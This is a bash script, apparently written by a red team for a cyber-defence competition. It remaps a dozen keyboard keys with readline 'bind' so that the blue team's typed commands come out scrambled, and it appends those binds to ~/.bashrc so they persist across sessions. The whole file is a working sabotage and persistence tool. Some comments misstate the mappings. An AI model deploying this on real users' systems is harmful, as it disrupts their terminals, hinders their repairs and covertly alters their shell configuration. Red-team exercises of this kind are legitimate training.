#!/bin/bash
###########################################################
# Author: Alyssa Rios                                     #
# Date: 2/10/2025                                         #
# Team: Red                                               #
# This file batch scrambles characters from alphabet and  #
# commonly used characters on the machine to make it more #
# difficult for the blue team to fix their services       #
###########################################################
bind '"a":"q"' # when the a key is pressed, q will be output
# bind '"b":"-"' # when the b key is pressed, - will be output
bind '"c":"p"' # when the c key is pressed, p will be output
# bind '"d":"b"' # when the d key is pressed, b will be output
bind '"e":"t"' # when the e key is pressed, t will be output
# bind '"f":"g"' # when the f key is pressed, g will be output
# bind '"g":"."' # when the g key is pressed, . will be output
# bind '"h":"k"' # when the h key is pressed, k will be output
bind '"i":"y"' # when the i key is pressed, y will be output
# bind '"j":"a"' # when the j key is pressed, a will be output
# bind '"k":"m"' # when the k key is pressed, m will be output
bind '"l":"v"' # when the l key is pressed, v will be output
bind '"m":"j"' # when the m key is pressed, j will be output
# bind '"n":";"' # when the n key is pressed, ; will be output
bind '"o":"x"' # when the o key is pressed, x will be output
# bind '"p":"t"' # when the p key is pressed, t will be output
# bind '"q":"x"' # when the q key is pressed, x will be output
bind '"r":"d"' # when the r key is pressed, / will be output
#bind '"s":""' # when the s key is pressed,  will be output
# bind '"t":"j"' # when the t key is pressed, j will be output
bind '"u":"k"' # when the u key is pressed, k will be output
# bind '"v":" "' # when the v key is pressed, " " will be output
bind '"w":"n"' # when the w key is pressed, n will be output
# bind '"x":"|"' # when the x key is pressed, | will be output
# bind '"y":"e"' # when the y key is pressed, e will be output
# bind '"z":","' # when the z key is pressed, , will be output
bind '" ":"h"' # when the " " key is pressed, h will be output
# bind '".":"g"' # when the . key is pressed, h will be output
bind '"/":"z"' # when the / key is pressed, z will be output
# bind '",":""' # when the , key is pressed, z will be output
# bind '"|":"p"' # when the | key is pressed, p will be output
# bind '";":"u"' # when the ; key is pressed, u will be output
# bind '"-":"l"' # when the - key is pressed, l will be output


# For Persistence, adds the commands to bashrc so it maintains upon reboot
echo "bind '\"a\":\"q\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\" \":\"h\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"w\":\"n\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"u\":\"k\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"r\":\"d\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"o\":\"x\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"m\":\"j\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"l\":\"v\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"i\":\"y\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"/\":\"z\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"e\":\"t\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
echo "bind '\"c\":\"p\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.


